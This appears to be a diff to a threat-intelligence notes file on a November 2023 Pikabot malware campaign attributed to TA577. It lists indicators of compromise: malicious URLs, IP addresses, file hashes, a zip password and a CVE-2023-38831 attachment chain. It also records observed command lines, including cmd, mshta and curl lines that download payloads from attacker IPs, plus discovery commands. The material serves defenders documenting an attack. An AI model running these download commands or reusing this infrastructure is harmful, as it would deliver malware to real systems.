@@ -1,14 +1,20 @@
 09.11.2023 | Pikabot | TA577 | 1.1.15-ghost
 
 *************************************************
+
 .url https://19dm82.info/oat/
 .zip a71cef0ad51fbc6ba884bfafe81caf4b96e0d9f269259a6ff1984256e7c7682a pw = H17
 .zip ec43dc591301ff2396c6bbb05e0c0f3c67428d892b186c43751ededea4df222d
 .dll 4b6381f8ae9e9347dc019d12c4b05d113bac8609d8ba4f8511329baeb74615ec
 
+Spam switched to attachments using .REV -> CVE-2023-38831 -> CMD
+
+.rev 437928a8ea347a56fc84b0f0617dc8000c8b356ed3262e44897369134bac9197
+.dll 249679528a5e1ef5ab81330cfda85cb63a56653c5b5c881bcfc477a4a2261735
+
 *************************************************
 
-rar > cmd > curl > dll
+Exec #2 - url > zip > js > dll
 
 wscript.exe C:\Users\Admin\AppData\Local\Temp\RCVT.js
 
@@ -32,6 +38,38 @@ whoami.exe /all
 ipconfig.exe /all
 
 netstat.exe -aon
+
+*************************************************
+
+Exec #2 - rar > cmd > curl > dll
+
+cmd.exe /c ""C:\Users\Admin\AppData\Local\Temp\7zO0234CD4C\123.pdf .cmd" "
+
+mshta.exe "C:\Users\Admin\AppData\Local\Temp\7zO0234CD4C\123.pdf .cmd"
+
+cmd.exe" /c mkdir  C:\Poliset\Nolser & curl http://49.13.31.14/B1H/0.24001269586827656.dat --output C:\Poliset\Nolser\Droveyucse.OOOOOCCCCCXXXXX
+
+curl  http://49.13.31.14/B1H/0.24001269586827656.dat --output C:\Poliset\Nolser\Droveyucse.OOOOOCCCCCXXXXX
+
+cmd.exe /c mkdir  C:\Poliset\Nolser & curl http://49.13.31.229/tC1n0/0.6367245407014539.dat --output C:\Poliset\Nolser\Droveyucse.OOOOOCCCCCXXXXX
+
+curl http://49.13.31.229/tC1n0/0.6367245407014539.dat --output C:\Poliset\Nolser\Droveyucse.OOOOOCCCCCXXXXX
+
+cmd.exe /c mkdir  C:\Poliset\Nolser & curl http://49.13.75.67/WTouf67/0.7510127253072312.dat --output C:\Poliset\Nolser\Droveyucse.OOOOOCCCCCXXXXX
+
+curl http://49.13.75.67/WTouf67/0.7510127253072312.dat --output C:\Poliset\Nolser\Droveyucse.OOOOOCCCCCXXXXX
+
+cmd.exe /c mkdir  C:\Poliset\Nolser & curl 0.9243385009161337.dat --output C:\Poliset\Nolser\Droveyucse.OOOOOCCCCCXXXXX
+
+curl  0.9243385009161337.dat --output C:\Poliset\Nolser\Droveyucse.OOOOOCCCCCXXXXX
+
+cmd.exe /c mkdir  C:\Poliset\Nolser & curl 0.390005693644515.dat --output C:\Poliset\Nolser\Droveyucse.OOOOOCCCCCXXXXX
+
+curl  0.390005693644515.dat --output C:\Poliset\Nolser\Droveyucse.OOOOOCCCCCXXXXX
+
+cmd.exe /c mkdir  C:\Poliset\Nolser & curl 0.9834006761764054.dat --output C:\Poliset\Nolser\Droveyucse.OOOOOCCCCCXXXXX
+
+curl  0.9834006761764054.dat --output C:\Poliset\Nolser\Droveyucse.OOOOOCCCCCXXXXX
 
 *************************************************
 
